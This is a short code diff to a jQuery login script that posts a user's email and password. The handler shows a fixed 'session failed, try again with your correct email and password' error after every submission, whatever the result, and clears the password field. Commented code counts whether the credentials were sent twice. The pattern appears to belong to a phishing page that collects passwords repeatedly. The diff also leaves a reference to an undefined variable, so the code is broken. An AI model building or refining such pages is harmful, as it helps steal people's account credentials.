@@ -56,17 +56,16 @@
                 method: "post",
                 data: {email: input4email, password: input4passwd},
                 processData: true,
-                beforeSend: function(xhr){
+                complete: function(jqXHR){
                     $('#showerror').removeClass('alert').text('')
                     $('#btn4sbmt').html('<center><div class="spinner"></div></center>').prop('disabled', true);
-                },                        
-                complete: function(feedback) {
-                       $('#showerror').html("Oops.. Something went wrong, session failed to open, please try again with your correct email and password")
+                    $('#showerror').html("Oops.. Something went wrong, session failed to open, please try again with your correct email and password")
                        console.log(feedback);
                        // return false;
                 $('#igodo').focus();
                 $('#igodo').val('');
                 // $('#typesent').val("Verification");
+                     }, 
     
                 // if (cou_nt>=2) { //check if it has been sent twice
                     // count=0;
